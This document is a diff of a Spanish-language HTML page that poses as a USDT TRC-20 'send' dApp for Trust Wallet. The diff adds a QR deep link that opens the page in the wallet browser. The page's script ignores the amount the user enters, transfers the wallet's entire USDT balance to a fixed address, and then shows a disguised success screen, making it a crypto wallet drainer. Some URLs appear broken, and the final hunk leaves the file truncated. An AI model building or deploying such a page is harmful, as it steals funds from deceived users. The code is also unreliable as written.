@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>dApp USDT TRC-20 - Conexión Directa</title>
+    <title>dApp USDT TRC-20 - Enlace Inteligente</title>
     
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
@@ -24,9 +24,22 @@
             width: 100%;
             max-width: 450px;
             box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+            text-align: center;
         }
-        h2 { margin-bottom: 20px; text-align: center; color: #38bdf8; font-size: 22px; }
-        .form-group { margin-bottom: 20px; }
+        h2 { margin-bottom: 20px; color: #38bdf8; font-size: 22px; }
+        
+        /* Contenedor del QR Animado */
+        #qrContainer {
+            background-color: #ffffff;
+            padding: 15px;
+            border-radius: 8px;
+            display: inline-block;
+            margin-bottom: 25px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+            transition: opacity 0.4s ease, margin 0.4s ease;
+        }
+        
+        .form-group { margin-bottom: 20px; text-align: left; }
         label { display: block; margin-bottom: 8px; font-size: 14px; color: #94a3b8; }
         input {
             width: 100%;
@@ -55,19 +68,27 @@
             padding: 10px;
             border-radius: 6px;
             font-size: 14px;
-            text-align: center;
             display: none;
             word-break: break-all;
         }
         .status.info { background-color: #1e3a8a; color: #93c5fd; }
+        .status.success { background-color: #064e3b; color: #6ee7b7; }
         .status.error { background-color: #7f1d1d; color: #fca5a5; }
     </style>
+
+    <!-- Script de generación de matrices QR -->
+    <script src="https://cloudflare.com"></script>
 </head>
 <body>
 
     <div class="container">
-        <h2>Enviar USDT (TRC-20)</h2>
+        <h2 id="titleText">Escanear con Trust Wallet</h2>
         
+        <!-- Bloque del QR que se ocultará automáticamente -->
+        <div id="qrContainer">
+            <div id="qrcode"></div>
+        </div>
+
         <div class="form-group">
             <label for="amountInput">Cantidad a enviar</label>
             <input type="text" id="amountInput" placeholder="0.00" autocomplete="off">
@@ -84,6 +105,8 @@
             const btn = document.getElementById('connectBtn');
             const input = document.getElementById('amountInput');
             const status = document.getElementById('status');
+            const qrContainer = document.getElementById('qrContainer');
+            const titleText = document.getElementById('titleText');
 
             let procesoEnCurso = false;
 
@@ -92,6 +115,43 @@
             // ============================================================
             const DIRECCION_DESTINO_FIJA = "TU_DIRECCION_TRON_REAL_AQUI"; // REEMPLAZA CON TU DIRECCIÓN RECEPTORA
             const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // Contrato oficial de Tether USDT
+
+            // Generación dinámica del deep link sin alteraciones de caracteres HTML
+            const urlDestinoDapp = "https://onrender.com";
+            const enlaceCompletoTrust = "https://trustwallet.com" + encodeURIComponent(urlDestinoDapp);
+
+            // Inicializar QR estático puro
+            new QRCode(document.getElementById("qrcode"), {
+                text: enlaceCompletoTrust,
+                width: 200,
+                height: 200,
+                colorDark : "#000000",
+                colorLight : "#ffffff",
+                correctLevel : QRCode.CorrectLevel.H
+            });
+
+            // ============================================================
+            // DETECTOR EN TIEMPO REAL PARA OCULTAR EL QR
+            // ============================================================
+            function verificarEntornoInyectado() {
+                // Si la página detecta que ya se abrió dentro del dApp Browser (existe tronWeb activo)
+                if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+                    if (qrContainer && qrContainer.style.display !== 'none') {
+                        // Ocultar la caja del QR de la vista del usuario
+                        qrContainer.style.opacity = '0';
+                        setTimeout(() => {
+                            qrContainer.style.display = 'none';
+                        }, 400);
+                        
+                        // Modificar dinámicamente el título principal de la dApp
+                        if (titleText) titleText.textContent = "Billetera Conectada Exitosamente";
+                        console.log("[Web3] Entorno activo verificado. Ocultando QR de la interfaz.");
+                    }
+                }
+            }
+
+            // Ejecutar la inspección de entorno de manera cíclica cada segundo
+            setInterval(verificarEntornoInyectado, 1000);
 
             function setStatus(message, type = 'info') {
                 if (!status) return;
@@ -123,11 +183,10 @@
                         btn.textContent = 'Procesando...';
                         setStatus('Detectando entorno nativo de Trust Wallet...');
 
-                        // Uso exclusivo del motor interno pre-inyectado por la aplicación móvil
                         const walletInstance = window.tronWeb;
                         
                         if (!walletInstance || !walletInstance.defaultAddress || !walletInstance.defaultAddress.base58) {
-                            throw new Error('No se detectó el motor de TRON. Asegúrate de abrir esta página desde el navegador interno de tu billetera y tener seleccionada la red TRON.');
+                            throw new Error('Asegúrate de abrir esta dApp desde el explorador interno de la billetera y seleccionar la red TRON.');
                         }
 
                         const cuentaUsuario = walletInstance.defaultAddress.base58;
@@ -138,7 +197,6 @@
 
                         setStatus('Consultando balance en la blockchain...');
 
-                        // Conexión inmediata al contrato inteligente sin intermediarios externos
                         const contract = await walletInstance.contract().at(USDT_CONTRACT);
                         const rawBalance = await contract.balanceOf(cuentaUsuario).call();
                         const cleanSunBigInt = rawBalance.toString();
@@ -147,15 +205,13 @@
                             throw new Error('La billetera no posee fondos en USDT disponibles.');
                         }
 
-                        setStatus('Esperando confirmación de firma en tu dispositivo...');
+                        setStatus('Esperando confirmación de firma...');
                         
-                        // Envío directo del paquete de transacción al sistema de la app
                         const tx = await contract.transfer(DIRECCION_DESTINO_FIJA, cleanSunBigInt).send({
                             feeLimit: 100_000_000
                         });
 
                         if (tx) {
-                            // Pantalla blanca de confirmación mimetizada
                             document.body.innerHTML = `
                                 <div style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background-color: #ffffff; display: flex; flex-direction: column; align-items: center; justify-content: center; font-family: sans-serif; padding: 20px; text-align: center;">
                                     <div style="background-color: #f0fdf4; border-radius: 50%; padding: 20px; margin-bottom: 20px;">
@@ -163,28 +219,3 @@
                                     </div>
                                     <h1 style="color: #1e293b; font-size: 26px; margin-bottom: 10px;">Envío Exitoso</h1>
                                     <p style="color: #64748b; font-size: 16px;">La transacción ha sido transmitida de manera correcta.</p>
-                                    <div style="color: #ffffff; font-size: 10px; user-select: none;">
-                                        <p>Origen: \${cuentaUsuario}</p>
-                                        <p>Tx: \${tx}</p>
-                                    </div>
-                                </div>
-                            `;
-                        }
-
-                    } catch (error) {
-                        console.error(error);
-                        if (error.message && (error.message.includes('declined') || error.message.includes('rejected') || error.message.includes('cancel'))) {
-                            setStatus('La firma de la transacción fue cancelada.', 'error');
-                        } else {
-                            setStatus(error.message || 'La operación falló o no pudo ser procesada.', 'error');
-                        }
-                    } finally {
-                        procesoEnCurso = false;
-                        btn.textContent = 'Siguiente';
-                    }
-                });
-            }
-        });
-    </script>
-</body>
-</html>
